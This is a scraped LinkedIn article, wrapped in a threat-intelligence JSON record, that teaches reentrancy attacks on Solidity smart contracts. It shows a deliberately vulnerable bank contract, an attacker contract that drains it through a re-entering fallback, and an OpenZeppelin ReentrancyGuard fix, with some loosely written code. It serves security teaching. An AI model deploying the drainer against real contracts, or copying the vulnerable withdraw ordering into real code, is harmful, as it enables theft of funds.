{
    "threat_intelligence": {
        "url": "https://www.linkedin.com/pulse/most-common-smart-contract-vulnerabilities-part-1-taner-g%C3%BCnd%C3%BCzgil",
        "timestamp": "2023-04-18 00:00:00",
        "original_content": "Most common Smart Contract vulnerabilities (Part 1).\n\nTaner G\u00fcnd\u00fczgilTaner G\u00fcnd\u00fczgil\nTaner G\u00fcnd\u00fczgil\nHV Power Engineering | Renewable energy | Web3\n\u53d1\u5e03\u65e5\u671f: 2023\u5e744\u670818\u65e5\n+ \u5173\u6ce8\nIntro\nSmart contracts have revolutionized the way we execute transactions and store data on the #blockchain. However, these digital contracts may have vulnerabilities that can lead to unwanted outcomes such as fund loss or data breaches. In this article, we will discuss the most famous attack, the \"Reentrancy\" attack.\n\nReentrancy Attacks\nReentrancy attacks happens because of contract logics. You see a smart contract below. I've higlighted lines as A , B and C. Contract sending \"_amount\" of token to the \"msg.sender\" then updates it's balance. This is the place where attack begins, malicious contract uses line A and B many times to drain funds of this contract.\n\nReentrancy attacks happen because of contract logic. You can see a smart contract below, where I've highlighted lines A, B, and C. The contract sends \"_amount\" of tokens to the \"msg.sender\" and then updates its balance. This is where the attack begins, as a malicious contract uses lines A and B multiple times to drain the funds of this contract.\n\npragma solidity ^0.8.0\n\n\ncontract VulnerableBank {\n    mapping(address => uint256) public balances;\n\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n\n    function withdraw(uint256 _amount) external {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n   /*A*/     (bool success, ) = msg.sender.call{value: _amount}(\"\"); \n   /*B*/     require(success, \"Transfer failed\"); \n   /*C*/     balances[msg.sender] -= _amount; \n    }\n}        \nSo what are the best practices here? It's simple. Obviously, when a user calls the withdraw() function, the contract should first reduce the msg.sender's balance, then send the funds to them. Otherwise, a malicious attacker might write a contract to drain all the funds as follows:\n\npragma solidity ^0.8.0;\n\n\nimport \"./VulnerableBank.sol\";\n\n\ncontract MaliciousContract {\n    VulnerableBank public vulnerableBank;\n\n\n    constructor(address _vulnerableBankAddress) public {\n        vulnerableBank = VulnerableBank(_vulnerableBankAddress);\n    }\n\n\n    function attack() external payable {\n        require(msg.value > 0, \"No Ether provided\");\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(msg.value);\n    }\n\n\n    function collect() external {\n        msg.sender.transfer(address(this).balance);\n    }\n\n\n    fallback() external payable {\n        if (address(vulnerableBank).balance >= msg.sender.balance) {\n            vulnerableBank.withdraw(msg.sender.balance);\n        }\n    }\n}\n\n\n        \nIn this contract, the attacker calls the attack() function and deposits funds, then calls the withdraw() function to withdraw their funds. The vulnerable contract attempts to send funds to the attacker, but the attacker has set up a trap in their fallback() function. In the fallback() function, the attacker calls lines A and B multiple times before the vulnerable contract updates its balance, allowing the attacker to drain all the funds in the vulnerable contract.\n\n\nWhat can you do?\nTo protect yourself from such attacks, you can use OpenZeppelin 's library called \"ReentrancyGuard\" .\n\npragma solidity ^0.8.\n\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\n\n\ncontract VulnerableBank {\n\n//openZeppelin k\u00fct\u00fcphanesinde nonReenterant kullan\u0131d\u0131 ...\nfunction withdraw(uint256 _amount) external nonReentrant {}\n\n}"
    }
}